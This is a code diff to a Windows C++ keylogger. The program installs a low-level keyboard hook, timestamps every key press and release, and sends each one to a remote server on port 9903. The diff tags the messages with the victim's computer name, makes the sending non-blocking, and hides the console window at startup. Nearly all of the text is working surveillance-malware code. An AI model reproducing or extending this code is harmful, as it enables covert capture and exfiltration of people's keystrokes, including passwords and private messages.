@@ -11,6 +11,7 @@ const int MaxIP = 1e2 + 5;
 
 bool key_down_running;
 char server_ip[MaxIP];
+char ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
 
 /**
  *@检测IP地址是否合法
@@ -64,9 +65,6 @@ void handshake()
 {
     for (;;)
     {
-        char ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
-        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
-        GetComputerNameA(ComputerName, &size);
         for (;;)
         {
             char *msg = net::Listen(8801);
@@ -117,6 +115,9 @@ void Main()
     }
 }
 
+/**
+ *@键盘钩子
+ */
 namespace KeyDown
 {
 char KeyWord[256][20] = {
@@ -178,10 +179,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ L
             char datetime[105];
             strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", localtime(&now));
             char message_tmp[1005];
-            sprintf(message_tmp, "[%s]:+%s\n", datetime, KeyWord[ks->vkCode]);
+            sprintf(message_tmp, "[%s %s]:+%s", ComputerName, datetime, KeyWord[ks->vkCode]);
             if (key_down_running)
             {
-                net::Send(server_ip, 9903, message_tmp);
+                net::SendNoWait(server_ip, 9903, message_tmp);
             }
         }
     }
@@ -195,10 +196,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ L
             char datetime[105];
             strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", localtime(&now));
             char message_tmp[1005];
-            sprintf(message_tmp, "[%s]:-%s\n", datetime, KeyWord[ks->vkCode]);
+            sprintf(message_tmp, "[%s %s]:-%s", ComputerName, datetime, KeyWord[ks->vkCode]);
             if (key_down_running)
             {
-                net::Send(server_ip, 9903, message_tmp);
+                net::SendNoWait(server_ip, 9903, message_tmp);
             }
             num = 1;
         }
@@ -208,10 +209,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ L
             char datetime[105];
             strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", localtime(&now));
             char message_tmp[1005];
-            sprintf(message_tmp, "[%s]:-%s\n", datetime, KeyWord[ks->vkCode]);
+            sprintf(message_tmp, "[%s %s]:-%s", ComputerName, datetime, KeyWord[ks->vkCode]);
             if (key_down_running)
             {
-                net::Send(server_ip, 9903, message_tmp);
+                net::SendNoWait(server_ip, 9903, message_tmp);
             }
         }
     }
@@ -237,8 +238,12 @@ int keyWord()
 }
 } // namespace KeyDown
 
-int main()
+int main(int argv, char *argc[])
 {
+    getchar();
+    ShowWindow(GetForegroundWindow(), 0);
+    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
+    GetComputerNameA(ComputerName, &size);
     std::thread hand(handshake);
     std::thread background(Main);
     std::thread keydown_listen(KeyDown::keyWord);
